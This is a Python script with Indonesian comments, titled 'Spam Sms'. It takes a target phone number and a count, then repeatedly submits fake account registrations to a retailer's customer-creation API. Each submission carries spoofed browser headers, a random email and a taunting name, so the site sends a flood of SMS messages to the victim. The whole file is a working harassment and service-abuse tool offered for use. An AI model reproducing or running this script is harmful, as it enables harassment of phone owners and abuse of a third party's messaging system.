try:    # Janggan di ubah
        import time,sys,os,json,requests,random
except ModuleNotFoundError:
         print ('[!] Install Modul Requests')
         os.system('pip install requests')

try:    # Janggan di ubah
        ip = requests.get('https://api.ipify.org').text
except requests.exceptions.ConnectionError:
        exit(' [!] Koneksi Internet Error')

# Janggan di ubah
Email = random.choice(['lavon.lockman@gmail.com','duane_mclaughlin38@gmail.com','alfreda.lindgren@gmail.com','leonardo_kuhlman@gmail.com','lyric51@gmail.com','devonte_littel@gmail.com','newell.kuhic@gmail.com'])
# Janggan di ubah
Name = random.choice(["Halo Penipu","Halo Kawan","Halo Sayang","Halo Janda","Halo Ripper"])

a,m,h,k,b,u,c,p,bn,o = [
'\033[90m',
'\033[31m',
'\033[32m',
'\033[33m',
'\033[94m',
'\033[35m',
'\033[36m',
'\033[37m',
'\033[41m',
'\033[0m'
]

import os

os.system("clear")
banner= """
\033[31m   _____                      \033[31m    _____
\033[31m  / ___/____  ____ _____ ___  \033[31m   / ___/____ ___  _____
\033[31m  \__ \/ __ \/ __ `/ __ `__ \ \033[31m   \__ \/ __ `__ \/ ___/
\033[37m ___/ / /_/ / /_/ / / / / / / \033[37m  ___/ / / / / / (__  )
\033[31m/____/ .___/\__,_/_/ /_/ /_/  \033[31m /____/_/ /_/ /_/____/
\033[37m    /_/ 
\033[37m[•]───────────────────────────────────────────[•]
\033[31m | [X]  Author  : DEMON 		       |
\033[31m | [X]  TEAM    : XXXXX                        |
\033[37m[•]───────────────────────────────────────────[•]"""
os.system('clear')
print (banner)
print ('%s[%s+%s] %sIP Kamu %s: %s%s' % (p,h,p,k,m,h,ip))
no = input('\n\033[37m[\033[31m•\033[37m] \033[31mex \033[37m: \033[31m08xx\n\033[37m[\033[32m+\033[37m] \033[31mPhone\033[37m:\033[32m ')
if no =='':
   exit('\033[37m[\033[31m!\033[37m] Dont be empty ')
elif len(no) <= 9:
   exit('\033[37m[\033[31m!\033[37m] Invalid number ')
else:
   jml = int(input('\n\033[37m[\033[32m+\033[37m] \033[31mAmount\033[37m:\033[32m '))

# Janggan di ubah
heder = {'Host': 'www.matahari.com',
           'content-length': '240',
           'origin': 'https://www.matahari.com',
           'x-newrelic-id': 'Vg4GVFVXDxAGVVlVBgcGVlY=',
           'content-type': 'application/json',
           'accept': '*/*',
           'user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36',
           'save-data': 'on',
           'sec-fetch-site': 'same-origin',
           'sec-fetch-mode': 'cors',
           'sec-fetch-dest': 'empty',
           'referer': 'https://www.matahari.com/customer/account/create/',
           'accept-encoding': 'gzip, deflate, br',
           'accept-language': 'id-ID,id;q=0.9,en;q=0.8'}

# Janggan di ubah
data = {
	"thor_customer": {
		"name": Name,
		"email_address": Email,
		"mobile_country_code": "+62",
		"gender_id": "1",
		"mobile_number": no,
		"mro": "",
		"password": "Wadepak1037",
		"birth_date": "04/02/2022"
		}
	}

print("\n\033[31m[\033[31m!\033[31m] \033[37mMessage ..\n")
for i in range(jml):
      # Janggan di ubah
      sec = requests.post('https://www.matahari.com/rest/V1/thorCustomers', headers=heder, json=data)
      if 'Success' in sec.text:
           print(f'\033[37m[\033[35m{i+1}\033[37m] \033[37mMessage \033[31m→ \033[32mSpam Sms Success')
      else:
           print(f'\033[37m[\033[35m{i+1}\033[37m] \033[37mMessage \033[31m→ \033[31mSpam Sms Failed')
      time.sleep(1.5)
print ('\n\033[37m[\033[35m✓\033[37m] \033[33mSpam Complete \033[31m>.<')
